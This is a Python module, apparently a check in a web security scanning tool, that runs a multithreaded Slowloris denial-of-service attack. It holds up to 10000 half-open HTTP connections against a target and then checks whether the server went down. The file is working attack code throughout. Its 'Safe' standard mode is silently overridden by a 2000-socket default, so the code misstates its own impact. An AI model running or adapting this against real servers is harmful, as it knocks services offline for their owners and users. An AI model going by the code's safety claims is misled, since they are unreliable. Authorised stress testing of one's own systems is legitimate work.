import socket
import time
import random
import ssl
from urllib.parse import urlparse
from ..models import CheckResult

def check(base_url, scenario, logger):
    """
    Multi-Threaded Slowloris DoS.
    Spawns multiple threads to maximize connection exhaustion (Choke).
    """
    import threading

    is_aggressive = scenario.config.get("aggressive", False)
    if not is_aggressive:
        print("    [DoS] Standard Mode: Running light connectivity check only (Safe).")
        target_socket_count = 10 # Very low for safe check
        duration = 5
        
    parsed = urlparse(base_url)
    target_ip = parsed.hostname
    port = parsed.port or (443 if parsed.scheme == "https" else 80)
    
    # Massive Scale
    target_socket_count = int(scenario.config.get("sockets", 2000)) 
    
    # Aggressive override: If user wants aggressive, we shouldn't be limited by weak config defaults
    if is_aggressive:
        # Override to ensure we actually drop the server as requested
        # 100 is way too low (default in yaml), 2000 is mild. 10000 is a good start.
        if target_socket_count < 10000:
             print(f"    [DoS] 🚀 AGGRESSIVE SCALING: Overriding sockets from {target_socket_count} to 10000")
             target_socket_count = 10000

    duration = int(scenario.config.get("duration", 60))
    
    # Optimize Thread Count for fast ramp-up
    # We want roughly 50-100 sockets per thread max to ensure quick filling
    thread_count = max(10, target_socket_count // 50) 
    if thread_count > 200: thread_count = 200 # Cap threads to avoid OS native thread issues
    
    sockets_per_thread = target_socket_count // thread_count
    
    print(f"    [DoS] Launching {target_socket_count} sockets across {thread_count} threads against {target_ip}:{port}...")

    # Shared state
    stop_event = threading.Event()
    stats = {"connected": 0, "dropped": 0}
    lock = threading.Lock()

    def attack_thread():
        my_sockets = []
        try:
            # 1. Fill Pool
            for _ in range(sockets_per_thread):
                if stop_event.is_set(): break
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(4)
                    if parsed.scheme == "https":
                        s = ssl.wrap_socket(s)
                    s.connect((target_ip, port))
                    s.send(f"GET {scenario.target} HTTP/1.1\r\n".encode("utf-8"))
                    s.send(f"Host: {target_ip}\r\n".encode("utf-8"))
                    s.send("User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n".encode("utf-8"))
                    s.send("Accept-language: en-US,en,q=0.5\r\n".encode("utf-8"))
                    my_sockets.append(s)
                    with lock: stats["connected"] += 1
                except:
                    pass
            
            # 2. Sustain
            while not stop_event.is_set():
                # Replenish
                while len(my_sockets) < sockets_per_thread and not stop_event.is_set():
                    try:
                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s.settimeout(4)
                        if parsed.scheme == "https":
                            s = ssl.wrap_socket(s)
                        s.connect((target_ip, port))
                        s.send(f"GET {scenario.target} HTTP/1.1\r\n".encode("utf-8"))
                        s.send(f"Host: {target_ip}\r\n".encode("utf-8"))
                        s.send("User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n".encode("utf-8"))
                        s.send("Accept-language: en-US,en,q=0.5\r\n".encode("utf-8"))
                        my_sockets.append(s)
                    except:
                        time.sleep(0.1) # Aggressive fast retry
                        break

                # Keep Alive
                for s in list(my_sockets):
                    try:
                        s.send(f"X-a: {random.randint(1, 5000)}\r\n".encode("utf-8"))
                    except:
                        my_sockets.remove(s)
                        with lock: stats["dropped"] += 1
                
                time.sleep(0.1) # Aggressive pulse

                
        except Exception:
            pass
        finally:
            for s in my_sockets:
                try: s.close()
                except: pass

    # Start Threads
    workers = []
    for _ in range(thread_count):
        t = threading.Thread(target=attack_thread)
        t.daemon = True
        t.start()
        workers.append(t)
        
    # Wait duration
    print(f"    [DoS] Holding connections for {duration}s...")
    time.sleep(duration)
    stop_event.set()
    
    for t in workers:
        t.join(timeout=2)

    # Analyze
    connected_peak = stats["connected"]
    dropped_total = stats["dropped"]
    
    # Liveness Check
    is_down = False
    print("    [DoS] Verifying if server is still up...")
    try:
        # Simple socket connect check to see if port is open/accepting
        s_check = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s_check.settimeout(3)
        if parsed.scheme == "https":
            s_check = ssl.wrap_socket(s_check)
        s_check.connect((target_ip, port))
        s_check.send(f"GET {scenario.target} HTTP/1.1\r\nHost: {target_ip}\r\n\r\n".encode("utf-8"))
        resp = s_check.recv(1024)
        s_check.close()
        if not resp: is_down = True
    except:
        is_down = True
        
    details = f"Peak Connections: {connected_peak}. Dropped: {dropped_total}. Server Down: {is_down}"

    if is_down:
         return CheckResult(scenario.id, scenario.type, "VULNERABLE", "CRITICAL", f"DoS SUCCESS: Server Dropped/Unresponsive. {details}")
    elif connected_peak > (target_socket_count * 0.5):
         return CheckResult(scenario.id, scenario.type, "VULNERABLE", "HIGH", f"DoS Partial Success (Choke). {details}")
    else:
         return CheckResult(scenario.id, scenario.type, "SECURE", "MEDIUM", f"Server resisted choke. {details}")
